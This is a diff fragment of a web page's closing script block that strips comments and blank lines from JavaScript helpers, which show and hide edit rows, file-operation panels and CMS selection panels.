     var parent = btn.parentNode;
-    // find sibling .edit-row
     var sibling = parent.nextElementSibling;
     if (!sibling || sibling.className.indexOf('edit-row') === -1) {
-        // maybe wrapped differently, search downwards
         var el = parent.parentNode.querySelector('.edit-row');
         sibling = el;
     }
@@ -2227,26 +2003,20 @@ function toggleEdit(btn) {
         sibling.style.display = (sibling.style.display === 'none' || sibling.style.display === '') ? 'block' : 'none';
     }
 }
-
-// File operations panel toggler
 function togglePanel(id){
     var el=document.getElementById(id);
     if(!el) return;
     var visible=el.style.display!=="none" && el.style.display!=="";
     if(visible){ el.style.display='none'; return; }
-    // hide others
     var panels=document.querySelectorAll('.op-panel');
     for(var i=0;i<panels.length;i++){ panels[i].style.display='none'; }
     el.style.display='block';
-    // scroll into view a bit for mobile
     setTimeout(function(){ try{ el.scrollIntoView({behavior:'smooth', block:'start'});}catch(e){} },100);
 }
 function collapseAll(){
     var panels=document.querySelectorAll('.op-panel');
     for(var i=0;i<panels.length;i++){ panels[i].style.display='none'; }
 }
-
-// CMS admin helpers
 function chooseCms(type){
     var t=document.getElementById('cms_type');
     if(t){ t.value=type; }
@@ -2260,5 +2030,4 @@ function collapseCms(){
     for(var i=0;i<p.length;i++){ p[i].style.display='none'; }
 }
 </script>
-<!-- No JS needed for modals; using CSS :target -->
 </html>
